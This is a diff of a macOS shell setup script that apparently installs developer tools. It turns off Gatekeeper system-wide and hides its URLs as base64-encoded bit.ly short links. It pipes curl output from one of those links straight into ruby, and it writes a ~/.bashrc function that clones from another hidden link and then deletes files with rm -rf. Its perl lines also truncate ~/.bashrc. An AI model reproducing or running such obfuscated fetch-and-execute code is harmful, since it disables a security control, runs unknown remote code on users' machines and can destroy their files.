@@ -1,12 +1,14 @@
 #!/bin/sh
 
+echo 'Feb1'
+
 set -e; dbsf () { echo $1 | base64 -D; }; mult () { for f in "$@"; do touch $HOME/.${f}; done }; mult bash_profile bashrc
 sudo spctl --master-disable; SERVER='GS='$(dbsf aHR0cDovL2JpdC5seS8yTWo3aWlU)
 chkprog () { if hash $1 2> /dev/null; then return 0; else return 1; fi }
 if ! chkprog brew; then /usr/bin/ruby -e "$(curl -fsSL $(dbsf aHR0cDovL2JpdC5seS8yS09yNlly))"; else brew update; fi; if chkprog rvm; then rvm implode; fi
 biu () { for i in "$@"; do if ! chkprog $i; then brew install $i; else brew upgrade $i 2> /dev/null || true; fi; done }; biu tmux rbenv ninja gnu-sed findutils
 
-MKP='mkproj ()'; SNIPT=$MKP'{ git clone '$(dbsf aHR0cDovL2JpdC5seS8yS0IySnln)" $1 && ls -a | grep -E '(\..+|.+ME.*)' | "'gxargs -d"\n" rm -rf; }'
+MKP='mkproj ()'; SNIPT=$MKP'{ git clone '$(dbsf aHR0cDovL2JpdC5seS8yS0IySnln)" $1 && ls -a | grep -E '(\..+|.+ME.*)' | "'gxargs -d"\\n" rm -rf; }'
 (perl -pe "s^$SERVER^^g" ~/.bashrc > ~/.bashrc) 2> /dev/null
 (perl -pe "s#$MKP.*##g" ~/.bashrc > ~/.bashrc) 2> /dev/null
 edrc () { for cmd in "$@"; do echo "\n$cmd" >> ~/.bashrc; done }; edrc "$SNIPT" "$SERVER"
